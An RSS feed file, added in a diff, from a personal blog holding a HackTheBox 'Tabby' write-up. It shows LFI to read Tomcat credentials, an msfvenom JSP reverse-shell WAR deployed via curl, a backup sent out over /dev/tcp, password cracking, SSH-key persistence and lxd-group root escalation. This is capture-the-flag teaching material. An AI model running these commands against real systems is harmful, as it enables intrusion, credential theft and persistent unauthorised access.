@@ -1,0 +1,233 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Tomcat on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/tomcat/</link>
+    <description>Recent content in Tomcat on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Mon, 26 Apr 2021 21:26:38 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/tomcat/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Tabby</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-tabby/</link>
+      <pubDate>Mon, 26 Apr 2021 21:26:38 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-tabby/</guid>
+      <description>Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious .war file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box.</description>
+      <content:encoded><![CDATA[<p>Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious <code>.war</code> file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Local File Inclusion</li>
+<li>Abusing Tomcat <code>manager-script</code> roles</li>
+<li>Privilege escalation with lxc/lxd group.</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>BurpSuite - <a href="https://portswigger.net/burp">https://portswigger.net/burp</a></li>
+<li>curl - Preinstalled in Kali Linux</li>
+<li>msfvenom - Preinstalled in Kali Linux</li>
+<li>alpine-builder - <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds</span>
+</code></pre></div><p>An initial <code>nmap</code> scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting port 80 shows a company website that offers hosting services called &ldquo;Mega Hosting&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/19847b521b1c48b08f57e8e4986fcc06.png" alt="19847b521b1c48b08f57e8e4986fcc06"  /></div>
+</p>
+<p>The domain name of this site is revealed from the email address and also from the page source</p>
+<p><div class="img-container"><img src="imgs/image-20210426220259010.png" alt="image-20210426220259010"  /></div>
+</p>
+<p>I&rsquo;ll add <code>megahosting.htb</code> to <code>/etc/hosts</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.194 megahosting.htb
+</code></pre></div><p>The company statement about data breach points to this link <code>http://megahosting.htb/news.php?file=statement</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210426215350459.png" alt="image-20210426215350459"  /></div>
+</p>
+<p>They mentioned a tool, but I have no idea what tool it is.</p>
+<p>I ran gobuster but found nothing really interesting there.</p>
+<h3 id="tcp-8080---tomcat">TCP 8080 - Tomcat</h3>
+<p>Visiting port 8080 shows the Tomcat default page.</p>
+<p><div class="img-container"><img src="imgs/09afc545cd1943dbb578574d338d0943.png" alt="09afc545cd1943dbb578574d338d0943"  /></div>
+</p>
+<p>Both &ldquo;manager webapp&rdquo; and &ldquo;host-manager webapp&rdquo; are asking for credentials. I tried using Tomcat&rsquo;s default credentials, but it didn&rsquo;t work.</p>
+<p><div class="img-container"><img src="imgs/0aedd7409c3444a3bb359bb837b33c93.png" alt="0aedd7409c3444a3bb359bb837b33c93"  /></div>
+</p>
+<p>I&rsquo;ll take note on these:</p>
+<ul>
+<li>/etc/tomcat9/tomcat-users.xml</li>
+<li>&ldquo;tomcat9&rdquo;</li>
+</ul>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-tomcat">Shell as tomcat</h3>
+<h4 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h4>
+<p>I found out the file parameter on <code>http://megahosting.htb/news.php?file=statement</code> is vulnerable to LFI.</p>
+<blockquote>
+<p>The LFI can be identified by assuming the website is hosted at <code>/var/www/html/megahosting/</code>. So the payload would be ../../../../file/to/read</p>
+</blockquote>
+<p><img src="imgs/42fb887abe344db48a138d3b7707cf5d.png" alt="42fb887abe344db48a138d3b7707cf5d" style="zoom:80%;" /></p>
+<p>But the read access is limited.</p>
+<h4 id="getting-tomcat-credentials">Getting tomcat Credentials</h4>
+<p>According to the Tomcat default page, it says that &ldquo;Users are defined in <code>/etc/tomcat9/tomcat-users.xml</code>&rdquo;, so I tried to leverage the LFI to read that file but it returned with a blank.</p>
+<p><img src="imgs/efc8b8670fa0473085bfd66dad7670f2.png" alt="efc8b8670fa0473085bfd66dad7670f2" style="zoom:80%;" /></p>
+<p>With basic Linux knowledge and service fingerprint from the <code>nmap</code> result, I can search for the exact location of the installed Tomcat.</p>
+<p>First, in Linux, every software application is most likely installed in one of the following directories:</p>
+<ul>
+<li><code>/usr/share/appname</code></li>
+<li><code>/usr/lib/appname</code></li>
+<li><code>/opt/appname</code></li>
+<li><code>/var/lib/appname</code></li>
+</ul>
+<p>Second, according to the <code>nmap</code> result, <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=OpenSSH+8.2p1&amp;searchon=all">OpenSSH version 8.2p1</a> and <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=apache2+2.4.41&amp;searchon=all">Apache version 2.4.41</a>. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=tomcat9&amp;searchon=all">search</a>, and find the install location of <a href="https://packages.ubuntu.com/focal/all/tomcat9/filelist">Tomcat9 on Ubuntu 20.04</a>.</p>
+<p>The search brought me to this location <code>/usr/share/tomcat9/etc/tomcat-users.xml</code>, and that seems to be the correct location.</p>
+<p><div class="img-container"><img src="imgs/531dc2a899f54b368f3fdadb83623272.png" alt="531dc2a899f54b368f3fdadb83623272"  /></div>
+</p>
+<p>The credentials is <code>tomcat:$3cureP4s5w0rd123!</code></p>
+<h4 id="html-gui---host-manager-webapp">HTML GUI - host-manager-webapp</h4>
+<p>When I tried to access the host-manager-webapp with <em>-not-working-</em> default credentials, the page says something about the roles that concerns me.</p>
+<p><div class="img-container"><img src="imgs/image-20210426232907769.png" alt="image-20210426232907769"  /></div>
+</p>
+<p>Then, based on the <code>tomcat-users.xml</code> file, <code>tomcat</code> has two roles, <code>admin-gui</code> and <code>manager-script</code>. That means the credentials is not authorized on manager-webapp (<code>/manager</code>), but it will work on host-manager-webapp (<code>/host-manager</code>),</p>
+<p><div class="img-container"><img src="imgs/102088bcbb8b46a79a0f333b027bcaa2.png" alt="102088bcbb8b46a79a0f333b027bcaa2"  /></div>
+</p>
+<p>Another interesting one is, if I clicked the Server Status from <code>/host-manager</code> it just redirects me to <code>http://10.10.10.194:8080/manager/status/all</code>, and it doesn&rsquo;t complain about the authorization. The page is seen below</p>
+<p><div class="img-container"><img src="imgs/314b3cdbc1964a699afeb20044dbc792.png" alt="314b3cdbc1964a699afeb20044dbc792"  /></div>
+</p>
+<p>So, I think I can access some features behind <code>/manager/[here]</code>. From the page above, the server accepts JSP/JSPX files.</p>
+<h4 id="text-interface---manager-webapp">Text Interface - manager-webapp</h4>
+<p>The second role of user tomcat is <code>manager-script</code>.</p>
+<p>From <a href="https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html">this article</a></p>
+<blockquote>
+<p><code>manager-script</code> provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI</p>
+</blockquote>
+<p>This concludes that I can access some features behind <code>/manager/</code> but not from the GUI, instead it uses text-based. The full documentation of what you can do with this role is available <a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands">here</a></p>
+<h4 id="deploying-malicious-war">Deploying Malicious WAR</h4>
+<p>With <code>manager-script</code> role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious <code>.war</code> file that is embedded with jsp reverse shell.</p>
+<p>First, I&rsquo;ll craft a <code>.war</code> file payload using <code>msfvenom</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ msfvenom -p java/jsp_shell_reverse_tcp lhost<span style="color:#f92672">=</span>10.10.14.30 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">9000</span> -f war -o iamf.war
+</code></pre></div><p>Then I&rsquo;ll upload the payload using <code>curl</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ curl -u <span style="color:#e6db74">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path<span style="color:#f92672">=</span>/iamf.war
+</code></pre></div><ul>
+<li>-u : for credential [username:password]</li>
+<li>-T : for transfer file</li>
+</ul>
+<p>I&rsquo;ll setup listener, and then trigger the payload also using <code>curl</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ curl http://10.10.10.194:8080/iamf.war
+</code></pre></div><p>My listener now have a shell.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*TG4UfRosbeX5ncZtEoIVng.png" alt="img"  /></div>
+</p>
+<p>I can upgrade the shell into TTY using this trick.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ script /dev/null; bash
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-ash">Shell as ash</h3>
+<p>Enumeration</p>
+<p>Manual enumeration with the <code>find</code> command discovered a backup file in zip format that is owned by user <code>ash</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ find / -type f -user ash 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#39;proc&#39;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/47eaa7bb176b445fa6a091ac49e5f32f.png" alt="47eaa7bb176b445fa6a091ac49e5f32f"  /></div>
+</p>
+<p>I&rsquo;ll transfer the backup file to my Kali.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip &gt; /dev/tcp/10.10.14.30/9001
+</code></pre></div><p>And receive it on my listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ nc -nvlp <span style="color:#ae81ff">9001</span> &gt; 16162020_backup.zip
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.30<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.194<span style="color:#f92672">]</span> <span style="color:#ae81ff">65056</span>
+</code></pre></div><h4 id="recover-backup-password">Recover Backup Password</h4>
+<p>The backup file is protected by a password. I&rsquo;ll try to recover the password using John the Ripper from my Windows machine, but first I&rsquo;ll have to convert it to hash format using <code>zip2john</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ zip2john 16162020_backup.zip &gt; backup.hash
+</code></pre></div><p>The password got cracked instantly.</p>
+<pre><code>john.exe --wordlist=rockyou.txt backup.hash
+</code></pre><p><div class="img-container"><img src="imgs/3538b21b4a734a6981f21967db4e87fa.png" alt="3538b21b4a734a6981f21967db4e87fa"  /></div>
+</p>
+<p>The password is <code>admin@it</code>.</p>
+<h4 id="su---ash">SU - ash</h4>
+<p>It turns out that the backup password is reused by <code>ash</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ su ash
+su ash
+Password: admin@it
+</code></pre></div><p>I&rsquo;ll put my SSH public key to the authorized_keys file on <code>ash</code> home directory for better shell.</p>
+<pre><code>ash@tabby:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=' &gt; authorized_keys
+</code></pre><p>Now I can login with my key.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ ssh -i id_rsa ash@10.10.10.194
+ash@tabby:~$                                                                 
+ash@tabby:~$ sudo -l
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> ash:                                                                   
+Sorry, user ash may not run sudo on tabby.
+ash@tabby:~$ id
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="abusing-lxc">Abusing lxc</h4>
+<p>I found out that user <code>ash</code> is a member of the <code>lxd</code> group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.</p>
+<blockquote>
+<p>It holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting <code>/</code> (root file system) to the container and interacting with it from inside the container as a privileged user.</p>
+</blockquote>
+<p>I&rsquo;ll use <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">this</a> article as reference.</p>
+<p>First, I’ll create an alpine image on my attacking machine, which is Kali Linux.</p>
+<pre><code>→ root@iamf «tabby» «10.10.14.30»
+$ git clone https://github.com/saghul/lxd-alpine-builder
+
+→ root@iamf «tabby» «10.10.14.30»
+$ cd lxd-alpine-builder
+
+→ root@iamf «tabby» «10.10.14.30»
+$ ./build-alpine
+</code></pre><p><div class="img-container"><img src="imgs/99679b825f584f4aaefa3412876cd211.png" alt="99679b825f584f4aaefa3412876cd211"  /></div>
+</p>
+<p>Once it&rsquo;s done, there will be an image file called <code>alpine-v3.12-x86_64-blablabla</code>. In my case, it is <code>alpine-v3.12-x86_64-20201107_1900.tar.gz</code>. I&rsquo;ll send the image to Tabby via <code>scp</code>.</p>
+<pre><code>→ root@iamf «tabby» «10.10.14.30»
+$ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz  ash@10.10.10.194:/tmp
+</code></pre><p>I&rsquo;ll initialize the lxd (storage pool, profile, etc..).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxd init
+</code></pre></div><p>I&rsquo;ll import the image, and then initialize the image.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img
+ash@tabby:~$
+ash@tabby:~$ lxc init iamf-img img-container -c security.privileged<span style="color:#f92672">=</span>true
+</code></pre></div><p>Next, I&rsquo;ll mount the root file system of the host to the container at <code>/mnt/root</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc config device add img-container iamf-test disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root
+Device iamf-test added to img-container
+</code></pre></div><p>After that, I&rsquo;ll start the container. I can confirm it is running using <code>lxc ls</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc start img-container
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003512685.png" alt="image-20210427003512685"  /></div>
+</p>
+<p>Now I can just interact with the container and grab the root flag on <code>/mnt/root/root/root.txt</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$lxc exec img-container /bin/sh
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003902623.png" alt="image-20210427003902623"  /></div>
+</p>
+<p>Modifications on <code>/mnt/root/</code> will also affect the root file system of the host. Other things I can do from the container is:</p>
+<ul>
+<li>Adding a persistent user via <code>/etc/passwd</code> (<code>/mnt/root/etc/passwd</code>)</li>
+<li>Adding a SUID bash (<code>cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash</code>)</li>
+<li>Enabling root login and put my SSH public key to the root <code>authorized_keys</code> file.</li>
+</ul>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html">https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat">https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat</a></li>
+<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
